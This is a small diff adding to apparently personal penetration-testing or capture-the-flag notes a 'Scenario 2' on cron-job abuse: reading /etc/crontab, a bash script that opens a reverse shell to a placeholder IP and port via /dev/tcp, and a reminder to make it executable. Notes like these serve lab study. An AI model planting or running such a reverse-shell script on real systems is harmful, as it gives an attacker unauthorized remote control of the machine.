@@ -219,7 +219,13 @@ https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
 <details>
 <summary>Scenario 2</summary>
 
+```cat /etc/crontab``` - To find cronjobs.
 
+.sh file example.
+```#!/bin/bash```
+```bash -i >& /dev/tcp/[IP]/[PORT] 0>&1```
+
+Remember to ```chomd +x``` !
 
 </details>
 
